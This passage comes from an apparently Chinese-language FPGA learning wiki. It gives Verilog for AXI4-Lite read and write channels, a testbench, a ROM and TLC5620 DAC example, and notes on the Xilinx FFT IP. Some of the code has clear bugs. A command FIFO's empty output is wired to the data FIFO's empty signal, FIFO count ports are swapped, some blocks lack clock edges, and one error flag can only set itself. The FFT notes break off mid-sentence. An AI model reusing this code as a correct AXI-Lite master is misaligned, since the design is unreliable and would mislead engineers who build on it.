(rd_cmd_fifo_err ) ); endmodule axilite_wr_channel.vmodule axilite_wr_channel #( parameter USER_WR_DATA_WIDTH = 32,//用户写数据的位宽 parameter AXI_DATA_WIDTH = 32,//注释，AXI4_LITE的数据位宽只有32Bit或者64Bit parameter AXI_ADDR_WIDTH = 32// )( input clk ,//用户写时钟 input axi_clk ,//axi工作时钟 input reset ,//复位信号 //用户写地址写通道端口 input user_wr_en ,//用户写使能 input [USER_WR_DATA_WIDTH-1:0] user_wr_data ,//用户写数据 input [AXI_ADDR_WIDTH-1:0] user_wr_addr ,//用户写地址 output user_wr_ready ,//用户写准备信号 //写地址通道端口 output reg m_axi_awvalid ,//axi主机写地址有效 input m_axi_awready ,//axi从机写准备信号，为高表示准备好了，与m_axi_awvalid信号同时为高是，用户地址可以写入从机 output reg [AXI_ADDR_WIDTH-1:0] m_axi_awaddr ,//axi主机写入从机的地址信号 output [2:0] m_axi_awport ,//保护类型，表示一个传输的安全等级，默认为3’b000 //写数据通道端口 output reg m_axi_wvalid ,//axi写数据有效信号 input m_axi_wready ,//axi从机写数据准备信号，高表示准备好了，与m_axi_wvalid信号同时为高时，用户数据可以写入从机 output reg [AXI_DATA_WIDTH-1:0] m_axi_wdata ,//axi主机写入从机的数据信号 output [AXI_DATA_WIDTH/8 -1:0] m_axi_strb ,//axi指示有效字节位置，类似于掩码，默认全为1 //写响应信号 input m_axi_bvalid ,//axi写响应信号，从机到主机 output m_axi_bready ,//axi写准备信号，主机到从机，为高时表示主机准备好了，可以接收从机的响应 input [1:0] m_axi_bresp ,//axi响应信号，值为多少 //Debug信号 output reg wr_data_fifo_err,//这里是存储data数据fifo_err output reg wr_cmd_fifo_err//这里是存储addr数据fifo_err ); //大拍操作，避免用户时钟和axi时钟与复位信号不同源导致信号亚稳态 (* dont_touch=&quot;true&quot; *) reg reset_sync_d0; (* dont_touch=&quot;true&quot; *) reg reset_sync_d1; (* dont_touch=&quot;true&quot; *) reg reset_sync; (* dont_touch=&quot;true&quot; *) reg a_reset_sync_d0; (* dont_touch=&quot;true&quot; *) reg a_reset_sync_d1; (* dont_touch=&quot;true&quot; *) reg a_reset_sync; //wr_cmd_fifo内部端口信号 reg [31:0] cmd_din; reg cmd_wren; wire [31:0] cmd_dout; reg cmd_rden; wire cmd_wrfull; wire cmd_rdempty; wire [3:0] cmd_wrcount; wire [3:0] cmd_rdcount; //wr_data_fifo内部端口信号 reg [31:0] data_din; reg data_wren; wire [31:0] data_dout; reg data_rden; wire data_wrfull; wire data_rdempty; wire [3:0] data_wrcount; wire [3:0] data_rdcount; //状态机信号定义 reg [2:0] cur_status;//现状态 reg [2:0] nxt_status;//次状态 localparam WR_IDLE = 3&#x27;b000;//独热码 localparam WE_PRE = 3&#x27;b001; localparam WR_DATA_EN = 3&#x27;b010; localparam WR_END = 3&#x27;b100; //assign assign m_axi_bready = 1&#x27;b1 ; assign m_axi_strb = &#123;AXI_DATA_WIDTH/8&#123;1&#x27;d1&#125;&#125;;//表示的含义是32除以8=4，后面拼接1 assign m_axi_awport = 3&#x27;b000;//保护类型，表示一个传输的安全等级，默认为3’b000 assign user_wr_ready = reset_sync?1&#x27;b0:cmd_wrcount &lt;= &#x27;d12;//留出一些余量 //开始对复位信号进行打拍操作,防止亚稳态 always @(posedge clk) begin reset_sync_d0 &lt;= reset; reset_sync_d1 &lt;= reset_sync_d0; reset_sync &lt;= reset_sync_d1; end always @(posedge axi_clk) begin a_reset_sync_d0 &lt;= reset; a_reset_sync_d1 &lt;= a_reset_sync_d0; a_reset_sync &lt;= a_reset_sync_d1; end //将用户传过来的数据和地址写入FIFO中，只有当user_wr_ready信号为高电平时，才被允许将用户数据和地址写入FIFO中，否则，即使用户一直请求写使能，也不会写入到FIFO当中 always @(posedge clk)begin if(user_wr_ready==1&#x27;b1)begin cmd_wren &lt;= user_wr_en ; cmd_din &lt;= user_wr_addr ; data_wren &lt;= user_wr_en ; data_din &lt;= user_wr_data ; end else begin cmd_wren &lt;= 1&#x27;b0 ; cmd_din &lt;= 1&#x27;b0 ; data_wren &lt;= 1&#x27;b0 ; data_din &lt;= 1&#x27;b0 ; end end //状态机代码编写 always @(posedge axi_clk)begin if(a_reset_sync)begin//复位信号，高电平有效 cur_status &lt;= WR_IDLE ; end else cur_status &lt;= nxt_status ; end always @(*)begin//状态机使用组合逻辑实现 if(a_reset_sync) nxt_status &lt;= WR_IDLE ; else case (cur_status) WR_IDLE:begin if(~cmd_rdempty) nxt_status &lt;= WE_PRE ; else nxt_status &lt;= cur_status; end WE_PRE:begin nxt_status &lt;= WR_DATA_EN; end WR_DATA_EN:begin if(m_axi_bvalid&amp;&amp;m_axi_bready) nxt_status &lt;= WR_END ; else nxt_status &lt;= cur_status; end WR_END:begin nxt_status &lt;= WR_IDLE ; end default: nxt_status &lt;= WR_IDLE; endcase end //读地址和读数据 always @(*)begin if(a_reset_sync)begin cmd_rden &lt;= 1&#x27;b0; data_rden &lt;= 1&#x27;b0; end else begin cmd_rden &lt;= cur_status == WE_PRE; data_rden &lt;= cur_status == WE_PRE; end end always @(axi_clk)begin if(cmd_rden) m_axi_awaddr &lt;= cmd_dout; else m_axi_awaddr &lt;= m_axi_awaddr; end always @(axi_clk)begin if(cmd_rden) m_axi_wdata &lt;= data_dout; else m_axi_wdata &lt;= m_axi_wdata; end always @(posedge axi_clk)begin if(a_reset_sync) m_axi_wvalid &lt;= 1&#x27;b0; else if(m_axi_wvalid&amp;&amp;m_axi_wready) m_axi_wvalid &lt;= 1&#x27;b0; else if(cur_status == WE_PRE) m_axi_wvalid &lt;= 1&#x27;b1; else m_axi_wvalid &lt;= m_axi_wvalid; end always @(posedge axi_clk)begin if(a_reset_sync) m_axi_awvalid &lt;= 1&#x27;b0; else if(m_axi_awvalid&amp;&amp;m_axi_awready) m_axi_awvalid &lt;= 1&#x27;b0; else if(cur_status == WE_PRE) m_axi_awvalid &lt;= 1&#x27;b1; else m_axi_awvalid &lt;= m_axi_awvalid; end //调试信号 always @(posedge clk)begin if(reset_sync) wr_cmd_fifo_err &lt;= 1&#x27;b0; else if(cmd_wrfull&amp;&amp;user_wr_en) wr_cmd_fifo_err &lt;= 1&#x27;b1; else wr_cmd_fifo_err &lt;= wr_cmd_fifo_err; end always @(posedge clk)begin if(reset_sync) wr_data_fifo_err &lt;= 1&#x27;b0; else if(data_wrfull&amp;&amp;user_wr_en) wr_data_fifo_err &lt;= 1&#x27;b1; else wr_data_fifo_err &lt;= wr_data_fifo_err; end // 例化fifo_w32xd16 fifo_w32xd16 wr_cmd_fifo( .rst (reset_sync ), .wr_clk (clk ), .rd_clk (axi_clk ), .din (cmd_din ), .wr_en (cmd_wren ), .rd_en (cmd_rden ), .dout (cmd_dout ), .full (cmd_wrfull ), .empty (data_rdempty), .rd_data_count (cmd_wrcount), .wr_data_count (cmd_rdcount) ); fifo_w32xd16 wr_data_fifo( .rst (reset_sync ), .wr_clk (clk ), .rd_clk (axi_clk ), .din (data_din ), .wr_en (data_wren ), .rd_en (data_rden ), .dout (data_dout ), .full (data_wrfull), .empty (data_rdempty), .rd_data_count (data_rdcount), .wr_data_count (data_wrcount) ); endmodule axilite_rd_channel.vmodule axilite_rd_channel#( parameter USER_RD_DATA_WIDTH = 32,//用户读数据的数据位宽 parameter AXI_DATA_WIDTH = 32,//注释，AXI4_LITE的数据位宽只有32Bit或者64Bit parameter AXI_ADDR_WIDTH = 32 // )( input clk ,//用户写时钟 input axi_clk ,//axi工作时钟 input reset ,//复位信号 //用户读取数据端口 input user_rd_en ,//用户读数据使能 input [AXI_ADDR_WIDTH-1:0] user_rd_addr ,//用户读地址位宽 output user_rd_ready ,//用户读准备信号 output reg user_rd_valid ,//用户读有效信号 output reg [USER_RD_DATA_WIDTH-1:0] user_rd_data ,//用户读数据信号位宽 //axi读地址接口 output reg m_axi_arvalid ,//axi主机读地址有效 input m_axi_arready ,//axi主机读地址准备 output reg [AXI_ADDR_WIDTH-1:0] m_axi_araddr ,//axi主机读地址数据 output [2:0] m_axi_arport ,//保护类型，表示一个传输的安全等级，默认为3’b000 //axi读数据接口 input m_axi_rvalid ,//axi主机读数据有效 output m_axi_rready ,//axi主机读数据准备 input [AXI_ADDR_WIDTH-1:0] m_axi_rdata ,//axi主机读数据 input [1:0] m_axi_rresp ,//axi主机读响应信号 //Debug信号 output reg rd_data_fifo_err ,// output reg rd_cmd_fifo_err ); //打拍操作，避免用户时钟和axi时钟与复位信号不同源导致信号亚稳态 (* dont_touch=&quot;true&quot; *) reg reset_sync_d0; (* dont_touch=&quot;true&quot; *) reg reset_sync_d1; (* dont_touch=&quot;true&quot; *) reg reset_sync; (* dont_touch=&quot;true&quot; *) reg a_reset_sync_d0; (* dont_touch=&quot;true&quot; *) reg a_reset_sync_d1; (* dont_touch=&quot;true&quot; *) reg a_reset_sync; //wr_cmd_fifo内部端口信号 reg [31:0] cmd_din; reg cmd_wren; wire [31:0] cmd_dout; reg cmd_rden; wire cmd_wrfull; wire cmd_rdempty; wire [3:0] cmd_wrcount; wire [3:0] cmd_rdcount; //wr_data_fifo内部端口信号 reg [31:0] data_din; reg data_wren; wire [31:0] data_dout; wire data_rden; wire data_wrfull; wire data_rdempty; wire [3:0] data_wrcount; wire [3:0] data_rdcount; //状态机信号定义 reg [2:0] cur_status;//现状态 reg [2:0] nxt_status;//次状态 localparam RD_IDLE = 3&#x27;b000;//独热码 localparam RD_PRE = 3&#x27;b001; localparam RD_DATA_EN = 3&#x27;b010; localparam RD_END = 3&#x27;b100; //assign assign m_axi_arport = 3&#x27;b000; assign m_axi_rready = 1&#x27;b1; assign user_rd_ready = reset_sync?1&#x27;b0:cmd_wrcount &lt;= &#x27;d12;//留出一些余量; //开始对复位信号进行打拍操作,防止亚稳态 always @(posedge clk) begin reset_sync_d0 &lt;= reset; reset_sync_d1 &lt;= reset_sync_d0; reset_sync &lt;= reset_sync_d1; end always @(posedge axi_clk) begin a_reset_sync_d0 &lt;= reset; a_reset_sync_d1 &lt;= a_reset_sync_d0; a_reset_sync &lt;= a_reset_sync_d1; end // 将用户端的读地址写入cmd_fifo always @(posedge clk) begin if(user_rd_ready)begin cmd_wren &lt;= user_rd_en ; cmd_din &lt;= user_rd_addr; end else begin cmd_wren &lt;= 1&#x27;b0 ; cmd_din &lt;= 1&#x27;b0 ; end end //状态机 always @(axi_clk) begin if(a_reset_sync) cur_status &lt;= RD_IDLE; else cur_status &lt;= nxt_status; end always @(*)begin//状态机使用组合逻辑实现 if(a_reset_sync) nxt_status &lt;= RD_IDLE ; else case (cur_status) RD_IDLE:begin if(~cmd_rdempty) nxt_status &lt;= RD_PRE ; else nxt_status &lt;= cur_status; end RD_PRE:begin nxt_status &lt;= RD_DATA_EN; end RD_DATA_EN:begin if(m_axi_rvalid &amp;&amp; m_axi_rready) nxt_status &lt;= RD_END ; else nxt_status &lt;= cur_status; end RD_END:begin nxt_status &lt;= RD_IDLE ; end default: nxt_status &lt;= RD_IDLE; endcase end // 发起AXI4读请求 always @(*) begin if(a_reset_sync) cmd_rden &lt;= 1&#x27;d0; else cmd_rden &lt;= cur_status == RD_PRE; end always @(posedge clk) begin if(cmd_rden) m_axi_araddr &lt;= cmd_dout; else m_axi_araddr &lt;= m_axi_araddr; end always @(posedge clk) begin if(a_reset_sync) m_axi_arvalid &lt;= 1&#x27;b0; else if(m_axi_arvalid &amp;&amp; m_axi_arready) m_axi_arvalid &lt;= 1&#x27;b0; else if(cur_status == RD_PRE) m_axi_arvalid &lt;= 1&#x27;b1; else m_axi_arvalid &lt;= m_axi_arvalid; end // 将AXI4的读数据写入data_fifo always @(posedge axi_clk) begin data_wren &lt;= m_axi_rvalid; data_din &lt;= m_axi_rdata; end assign data_rden = reset_sync ? 1&#x27;b0 : ~data_rdempty; always @(posedge clk) begin user_rd_valid &lt;= data_rden; user_rd_data &lt;= data_dout; end //调试信号 always @(posedge clk)begin if(reset_sync) rd_data_fifo_err &lt;= 1&#x27;b0; else if(rd_data_fifo_err &amp;&amp; user_rd_en) rd_data_fifo_err &lt;= 1&#x27;b1; else rd_data_fifo_err &lt;= rd_data_fifo_err; end always @(posedge clk)begin if(reset_sync) rd_cmd_fifo_err &lt;= 1&#x27;b0; else if(data_wrfull &amp;&amp; user_rd_en) rd_cmd_fifo_err &lt;= 1&#x27;b1; else rd_cmd_fifo_err &lt;= rd_cmd_fifo_err; end // 例化fifo_w32xd16 fifo_w32xd16 rd_cmd_fifo( .rst (reset_sync ), .wr_clk (clk ),//注意这里，写的时钟是clk的时钟 .rd_clk (axi_clk ),//读的时钟是axi的 .din (cmd_din ), .wr_en (cmd_wren ), .rd_en (cmd_rden ), .dout (cmd_dout ), .full (cmd_wrfull ), .empty (data_rdempty), .rd_data_count (cmd_wrcount), .wr_data_count (cmd_rdcount) ); fifo_w32xd16 rd_data_fifo( .rst (reset_sync ), .wr_clk (axi_clk ),//注意这里，写的时钟是axi的时钟 .rd_clk (clk ),//读的时钟是clk的 .din (data_din ), .wr_en (data_wren ), .rd_en (data_rden ), .dout (data_dout ), .full (data_wrfull), .empty (data_rdempty), .rd_data_count (data_rdcount), .wr_data_count (data_wrcount) ); endmodule 2.3 SIMtb_top.v`timescale 1ns/1ns module tb_top(); parameter USER_WR_DATA_WIDTH = 32; parameter USER_RD_DATA_WIDTH = 32; parameter AXI_DATA_WIDTH = 32; parameter AXI_ADDR_WIDTH = 32; reg user_wr_clk ; reg user_rd_clk ; reg axi_clk ; reg reset ; wire user_wr_en ; wire [USER_WR_DATA_WIDTH-1:0] user_wr_data ; wire [AXI_ADDR_WIDTH-1:0] user_wr_addr ; wire user_wr_ready ; wire user_rd_en ; wire [AXI_ADDR_WIDTH-1:0] user_rd_addr ; wire user_rd_ready ; wire user_rd_valid ; wire [USER_RD_DATA_WIDTH-1:0] user_rd_data ; wire m_axi_awvalid ; wire m_axi_awready ; wire [AXI_ADDR_WIDTH-1:0] m_axi_awaddr ; wire [2:0] m_axi_awport ; wire m_axi_wvalid ; wire m_axi_wready ; wire [AXI_ADDR_WIDTH-1:0] m_axi_wdata ; wire [AXI_DATA_WIDTH-1:0] m_axi_strb ; wire m_axi_bvalid ; wire m_axi_bready ; wire [1:0] m_axi_bresp ; wire m_axi_arvalid ; wire m_axi_arready ; wire [AXI_ADDR_WIDTH-1:0] m_axi_araddr ; wire [2:0] m_axi_arport ; wire m_axi_rvalid ; wire [AXI_ADDR_WIDTH-1:0] m_axi_rdata ; wire [1:0] m_axi_rresp ; wire m_axi_rready ; initial begin user_wr_clk = 1; forever #(10) user_wr_clk = ~user_wr_clk; end initial begin axi_clk = 1; forever #(5) axi_clk = ~axi_clk; end initial begin reset = 1; forever #(300) reset = 0; end user_req_generate #( .USER_WR_DATA_WIDTH (USER_WR_DATA_WIDTH), .AXI_ADDR_WIDTH (AXI_ADDR_WIDTH) )user_req_generate_inst( .clk (user_wr_clk ), .reset (reset ), .user_wr_en (user_wr_en ), .user_wr_addr (user_wr_addr ), .user_wr_data (user_wr_data ), .user_rd_en (user_rd_en ), .user_rd_addr (user_rd_addr ) ); axilite_master #( .USER_RD_DATA_WIDTH (USER_RD_DATA_WIDTH), .USER_WR_DATA_WIDTH (USER_WR_DATA_WIDTH), .AXI_DATA_WIDTH (AXI_DATA_WIDTH ), .AXI_ADDR_WIDTH (AXI_ADDR_WIDTH ) )axilite_master_inst( .user_wr_clk (user_wr_clk ), .user_rd_clk (user_rd_clk ), .axi_clk (axi_clk ), .reset (reset ), .user_wr_en (user_wr_en ), .user_wr_data (user_wr_data ), .user_wr_addr (user_wr_addr ), .user_wr_ready (user_wr_ready), .user_rd_en (user_rd_en ), .user_rd_addr (user_rd_addr ), .user_rd_ready (user_rd_ready), .user_rd_valid (user_rd_valid), .user_rd_data (user_rd_data ), .m_axi_awvalid (m_axi_awvalid), .m_axi_awready (m_axi_awready), .m_axi_awaddr (m_axi_awaddr ), .m_axi_awport (m_axi_awport ), .m_axi_wvalid (m_axi_wvalid ), .m_axi_wready (m_axi_wready ), .m_axi_wdata (m_axi_wdata ), .m_axi_strb (m_axi_strb ), .m_axi_bvalid (m_axi_bvalid ), .m_axi_bready (m_axi_bready ), .m_axi_bresp (m_axi_bresp ), .m_axi_arvalid (m_axi_arvalid), .m_axi_arready (m_axi_arready), .m_axi_araddr (m_axi_araddr ), .m_axi_arport (m_axi_arport ), .m_axi_rvalid (m_axi_rvalid ), .m_axi_rdata (m_axi_rdata ), .m_axi_rresp (m_axi_rresp ), .m_axi_rready (m_axi_rready ) ); blk_mem_gen_0 blk_mem_gen_0_inst ( .rsta_busy ( ), // output wire rsta_busy .rstb_busy ( ), // output wire rstb_busy .s_aclk (axi_clk ), // input wire s_aclk .s_aresetn (~reset ), // input wire s_aresetn .s_axi_awaddr (m_axi_awaddr ), // input wire [31 : 0] s_axi_awaddr .s_axi_awvalid (m_axi_awvalid ), // input wire s_axi_awvalid .s_axi_awready (m_axi_awready ), // output wire s_axi_awready .s_axi_wdata (m_axi_wdata ), // input wire [31 : 0] s_axi_wdata .s_axi_wstrb (m_axi_strb ), // input wire [3 : 0] s_axi_wstrb .s_axi_wvalid (m_axi_wvalid ), // input wire s_axi_wvalid .s_axi_wready (m_axi_wready ), // output wire s_axi_wready .s_axi_bresp (m_axi_bresp ), // output wire [1 : 0] s_axi_bresp .s_axi_bvalid (m_axi_bvalid ), // output wire s_axi_bvalid .s_axi_bready (m_axi_bready ), // input wire s_axi_bready .s_axi_araddr (m_axi_araddr ), // input wire [31 : 0] s_axi_araddr .s_axi_arvalid (m_axi_arvalid ), // input wire s_axi_arvalid .s_axi_arready (m_axi_arready ), // output wire s_axi_arready .s_axi_rdata (m_axi_rdata ), // output wire [31 : 0] s_axi_rdata .s_axi_rresp (m_axi_rresp ), // output wire [1 : 0] s_axi_rresp .s_axi_rvalid (m_axi_rvalid ), // output wire s_axi_rvalid .s_axi_rready (m_axi_rready ) // input wire s_axi_rready ); endmodule user_req_generate.vmodule user_req_generate #( parameter USER_WR_DATA_WIDTH = 32, parameter AXI_ADDR_WIDTH = 32 )( input\twire clk, input wire reset, output\treg user_wr_en, output reg [AXI_ADDR_WIDTH-1:0] user_wr_addr, output reg [USER_WR_DATA_WIDTH-1:0] user_wr_data, output reg user_rd_en, output reg [USER_WR_DATA_WIDTH-1:0] user_rd_addr ); reg [2:0] status; localparam IDLE = 3&#x27;b000; localparam WAIT = 3&#x27;b001; localparam WR = 3&#x27;b010; localparam RD = 3&#x27;b100; reg [7:0] wait_cnt; reg [3:0] wr_cnt; reg [3:0] rd_cnt; always @(posedge clk) begin if(reset) wait_cnt &lt;= 8&#x27;b0; else if(wait_cnt == 100) wait_cnt &lt;= 8&#x27;b0; else if(status == WAIT) wait_cnt &lt;= wait_cnt + 1&#x27;b1; else wait_cnt &lt;= wait_cnt; end always @(posedge clk) begin if(reset) wr_cnt &lt;= 4&#x27;b0; else if(user_wr_en &amp;&amp; wr_cnt == 10) wr_cnt &lt;= 4&#x27;b0; else if(user_wr_en) wr_cnt &lt;= wr_cnt + 1&#x27;b1; else wr_cnt &lt;= wr_cnt; end always @(posedge clk) begin if(reset) rd_cnt &lt;= 4&#x27;b0; else if(user_rd_en &amp;&amp; rd_cnt == 10) rd_cnt &lt;= 4&#x27;b0; else if(user_rd_en) rd_cnt &lt;= rd_cnt + 1&#x27;b1; else rd_cnt &lt;= rd_cnt; end always @(posedge clk) begin if(reset) user_wr_en &lt;= 1&#x27;b0; else if(user_wr_en &amp;&amp; wr_cnt == 10) user_wr_en &lt;= 1&#x27;b0; else if(status == WR) user_wr_en &lt;= 1&#x27;b1; else user_wr_en &lt;= user_wr_en; end always @(posedge clk) begin if(reset) user_rd_en &lt;= 1&#x27;b0; else if(user_rd_en &amp;&amp; rd_cnt == 10) user_rd_en &lt;= 1&#x27;b0; else if(status == RD) user_rd_en &lt;= 1&#x27;b1; else user_rd_en &lt;= user_rd_en; end always @(posedge clk) begin if(reset) user_wr_addr &lt;= 0; else if(user_wr_en) user_wr_addr &lt;= user_wr_addr + USER_WR_DATA_WIDTH/8; else if(user_wr_addr == 1024 &amp;&amp; user_wr_en) user_wr_addr &lt;= 0; else user_wr_addr &lt;= user_wr_addr; end always @(posedge clk) begin if(reset) user_rd_addr &lt;= 0; else if(user_rd_en) user_rd_addr &lt;= user_rd_addr + USER_WR_DATA_WIDTH/8; else if(user_rd_addr == 1024 &amp;&amp; user_rd_en) user_rd_addr &lt;= 0; else user_rd_addr &lt;= user_rd_addr; end always @(posedge clk) begin if(reset) user_wr_data &lt;= 0; else if(user_wr_en) user_wr_data &lt;= user_wr_data + 1&#x27;b1 ; else user_wr_data &lt;= user_wr_data; end always @(*) begin if(reset) status &lt;= IDLE; else begin case (status) IDLE : status &lt;= WAIT; WAIT : if(wait_cnt == 100) status &lt;= WR; WR : if(wr_cnt == 10 &amp;&amp; user_wr_en) status &lt;= RD; RD : if(rd_cnt == 10 &amp;&amp; user_rd_en) status &lt;= IDLE; default: status &lt;= IDLE; endcase end end endmodule"},{"title":"参考链接","path":"/wiki/FPGA/小白FPGA_AXI4总线/参考链接.html","content":"参考链接AXI总线介绍_axi协议pdf-CSDN博客 AXI4_lite协议详解_axi4lite-CSDN博客"},{"title":"ROM IP核使用方法","path":"/wiki/FPGA/常用IP核/ROM IP核使用方法.html","content":"参考链接FPGA实验课8：ROM（IP核）使用实例_fpga的rom的ip如何调用-CSDN博客 Kimi人工智能 1. FPGA中位宽和深度的概念 位宽（Bit Width）： 想象一下，你有一条高速公路，这条高速公路有多个车道。位宽就是指这些车道的数量。比如，一个32位宽的寄存器就像是有32个车道的高速公路，可以同时让32辆车并排行驶。在FPGA中，位宽越大，意味着可以同时处理更多的数据，从而提高计算速度。 深度（Depth）： 现在，想象你有一座多层的停车场。深度就是指这座停车场有多少层。比如，一个深度为1024的存储器就像是有1024层的停车场，每一层都可以停放一辆车。在FPGA中，深度越大，意味着可以存储更多的数据。 总结一下： 位宽：一次操作可以处理的数据量。位宽越大，数据处理能力越强。 深度：可以存储的数据总量。深度越大，存储容量越大。 2. ROM IP核的使用方法2.1 仿真结果 rom_ip.vmodule ROM_IP( input sys_clk, input sys_rst_n, // TLC5620的引脚 output wire da_clk , // 时钟信号 output wire da_data , // 数据信号 output wire da_ldac , // LDAC信号 output wire da_load , // LOAD信号 output wire [7:0] wave ); // rom地址控制模块 reg [12:0] addr; always @(posedge sys_clk or negedge sys_rst_n) begin if(!sys_rst_n) addr &lt;= 13&#x27;d0; else if(addr == 13&#x27;d4095) addr &lt;= 13&#x27;d0; else addr &lt;= addr + 1&#x27;d1; end // 实例化ROM IP核 rom rom_inst ( .address ( addr ), .clock ( sys_clk ), .q ( wave ) ); // 实例化tlc5620驱动模块 tlc_5620 tlc_5620_inst ( .CLOCK_50(sys_clk), // 系统时钟 .RST_N(sys_rst_n), // 复位信号 .da_enable(1&#x27;b1), // 使能信号，始终使能 .da_range(1&#x27;b0), // 输出范围选择，根据需要设置 .da0_data(wave), // 将dac_data连接到DA0通道 .da1_data(8&#x27;b0), // 其他通道暂时不使用，置为0 .da2_data(8&#x27;b0), // 其他通道暂时不使用，置为0 .da3_data(8&#x27;b0), // 其他通道暂时不使用，置为0 .SCK(da_clk), // 连接到外部引脚 .SDI(da_data), // 连接到外部引脚 .LOAD(da_load) // 连接到外部引脚 ); // TLC5620的LDAC信号通常需要保持低电平以更新输出电压 assign da_ldac = 1&#x27;b0; endmodule tlc5620.vmodule tlc_5620 ( input CLOCK_50, input RST_N, // input da_enable, input da_range, // 0, 1倍参考电压; 1, 2倍参考电压 input [7:0] da0_data, // 0~255 input [7:0] da1_data, // 0~255 input [7:0] da2_data, // 0~255 input [7:0] da3_data, // 0~255 // output reg SCK, output reg SDI, output reg LOAD ); function integer log2(input integer n); integer i; for(i=0; 2**i &lt;=n; i=i+1) log2=i+1; endfunction /************************************** * 生成140ns的tick时钟 **************************************/ reg [log2(7):1]cnt_140ns; always@(posedge CLOCK_50, negedge RST_N) if(!RST_N) cnt_140ns &lt;= 0; else begin if(cnt_140ns &lt; 6) cnt_140ns &lt;= cnt_140ns + 1&#x27;b1; else cnt_140ns &lt;= 0; end wire tick_140ns = (cnt_140ns == 6) ? 1 : 0; /************************************** * 根据tick时钟生成da基准计数器 **************************************/ reg [log2(48):1] da_ref_cnt; // [0,47] always@(posedge CLOCK_50, negedge RST_N) if(!RST_N) da_ref_cnt &lt;= 0; else begin if(!da_enable) da_ref_cnt &lt;= 0; else begin if(tick_140ns) begin if(da_ref_cnt &lt; 47) da_ref_cnt &lt;= da_ref_cnt + 1&#x27;b1; else da_ref_cnt &lt;= 0; end end end wire tick_6720ns = (da_ref_cnt == 47) ? 1 : 0; reg [1:0] da_sel_cnt; always@(posedge CLOCK_50, negedge RST_N) if(!RST_N) da_sel_cnt &lt;= 2&#x27;b0; else if (tick_6720ns) begin if(da_sel_cnt &lt; 3) da_sel_cnt &lt;= da_sel_cnt + 1&#x27;b1; else da_sel_cnt &lt;= 2&#x27;b0; end /************************************** * 根据基准计数器生成串行信号 **************************************/ reg [7:0] da_data; always@(posedge CLOCK_50, negedge RST_N) if(!RST_N) da_data &lt;= 8&#x27;b0; else begin case(da_sel_cnt) 2&#x27;b00: da_data &lt;= da0_data; 2&#x27;b01: da_data &lt;= da1_data; 2&#x27;b10: da_data &lt;= da2_data; 2&#x27;b11: da_data &lt;= da3_data; endcase end always@(posedge CLOCK_50, negedge RST_N) if(!RST_N) begin SCK &lt;= 0; SDI &lt;= 0; LOAD &lt;= 0; end else begin if(tick_140ns) begin // 生成SCK信号 case(da_ref_cnt) 2,6,10,14,18,22,26,30,34,38,42: SCK &lt;= 1; 4,8,12,16,20,24,28,32,36,40,44: SCK &lt;= 0; default : ; // 缺省不操作 endcase // 生成LOAD信号 case(da_ref_cnt) 0: LOAD &lt;= 1; 46: LOAD &lt;= 0; default : ; // 缺省不操作 endcase // 送入串型数据 case(da_ref_cnt) 3,4: SDI &lt;= da_sel_cnt[1]; 7,8: SDI &lt;= da_sel_cnt[0]; 11,12: SDI &lt;= da_range; 15,16: SDI &lt;= da_data[7]; 19,20: SDI &lt;= da_data[6]; 23,24: SDI &lt;= da_data[5]; 27,28: SDI &lt;= da_data[4]; 31,32: SDI &lt;= da_data[3]; 35,36: SDI &lt;= da_data[2]; 39,40: SDI &lt;= da_data[1]; 43,44: SDI &lt;= da_data[0]; default : SDI &lt;= 1&#x27;b1; endcase end end endmodule"},{"title":"RAM IP核使用方法","path":"/wiki/FPGA/常用IP核/RAM IP核使用方法.html","content":"参考链接1. RAM IP2. ROM IP核的使用方法2.1 仿真结果rom_ip.v tlc5620.v"},{"title":"FFT IP核使用方法","path":"/wiki/FPGA/常用IP核/FFT IP核使用方法.html","content":"参考链接简介 • 快速傅里叶变换 LogiCORE IP 产品指南 （PG109） • 阅读器 • AMD 技术信息门户 — Introduction • Fast Fourier Transform LogiCORE IP Product Guide (PG109) • 阅读器 • AMD 技术信息门户 1. Xilinx FFT v9.0简介版本：9.1 接口（Interfaces）：AXI4-Stream FFT IP核简介：快速傅立叶变换（FFT）是一种计算离散傅立叶变换（DFT）的高效算法。FFT 内核可在多达 12 个并行通道上计算 8 至 65536 点的正向或反向复变。输入数据是复数值矢量，用 8 至 34 位宽的二乘数或 32 位宽的单精度浮点数表示。相位系数可以是 8 至 34 位宽。所有存储器都在芯片上，使用块 RAM 或分布式 RAM。提供三种算术类型：全精度无标度、标度定点和块浮点。有几个参数可在运行时配置：点大小、正向或反向变换的选择以及缩放时间表。有四种架构可供选择，以便在大小和转换时间之间进行权衡。 2.Vivado中IP核的配置主要配置通道数，点数，时钟，吞吐量，结构，以及是否可以运行时配置，需要注意的是结构的配置会影响调整因子。如下图所示： 第一页： **number of channels :**变换通道，可以选择多通道，实现多帧数据同时进行FFT运算； transform lenfgth : FFT变换长度（最大FFT点数），如果选择了最下面的‘run time configurable transdorm legth’,则该参数是FFT变化的最大长度，一般不选。 Target Clock Frequency (MHz)（目标时钟频率）：根据奈奎斯特采样定理，采样频率需大于信号频率的两倍； Target Data Throughput(MSPS)（目标数据吞吐量）：FFT采样点数，代表对信号在频域的采样数； architecure choice : 这个标签里主要是用来实现，FFT变换所选用的架构： Automatically selected ： 自动选择所需要的，FFT变化架构。 pipelined streaming ：并行流水线结构 radix-4, burst i&#x2F;o ： 基4 I&#x2F;O突发结构 radix-2, burst i&#x2F;o ：基2 I&#x2F;O突发结构 radix-2 life, burst i&#x2F;o ：基2 I&#x2F;O突发结构 ​ 其中流水线的结构变换处理时间最短，资源消耗最大。 run time configurable transdorm legth ： 该选项可以在FFT变换中通过设置s_axis_config_tdata中NFFT字段的长度来改变FFT变化的长度。 第二页：这里主要是配置 数据宽度，格式，控制信号，输出方式，和可选的控制信号。 **data format;**下拉标签中，对应着FFT IP核支持两种数据类型： 定点全精度 定点缩减位宽 **scaling optios :**缩放选项 ： block floating point :不管输入的格式如何，FFT变化内部都采用浮点，会根据每一级的的数据情况自动缩放。 这个模式的输入输出位宽一致，便于调用。 scaled :在m_axis_data_tuser中会有5BIT表示每一级的缩放情况,在s_axis_config_data中会有相应的字段配置配置缩放因子.每一级别包含2个stage ，2个bit 表示一级缩放，一般0-3可选，如果log(NFFT)不是2的倍数，则最高一级的缩放只能在0-1之间选取。 unscaled :不用担心变化过程中会出现溢出，但是输入是32bit的话，输出是64bit。 Precision Options：精度选项 Input Data Width：输入数据宽度 Phase Factor Width：相位因子宽度 Control Signals:控制信号，主要有时钟使能信号和低电平有效的复位信号 output odering options: 输出顺序选项。 nature order:就是FFT变化后的输出已经调整了顺序，按照xk_index自然顺序列出变化结果， bit&#x2F;digital reserved 